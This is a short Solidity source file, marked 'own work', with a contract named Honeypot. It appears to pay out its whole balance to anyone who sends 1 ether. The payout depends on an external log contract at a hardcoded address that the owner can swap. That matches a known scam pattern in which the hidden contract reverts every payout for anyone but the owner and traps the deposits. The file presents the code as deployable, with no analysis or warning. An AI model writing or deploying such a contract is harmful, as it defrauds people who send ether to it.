// own work
pragma solidity ^0.4.24;

contract Honeypot {
    address owner = msg.sender;
    LogFile log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);
    
    constructor() public payable {}
    
    function setLogFile(address _log) public {
        require(msg.sender == owner);
        log = LogFile(_log);
    }
    
    function retrieve() public payable {
        require(msg.value >= 1 ether);
        msg.sender.transfer(address(this).balance);
        log.addReceiver(msg.sender);
    }
}

contract LogFile {
    address[] public receivers;
    function addReceiver(address _address) public {
        receivers.push(_address);
    }
}
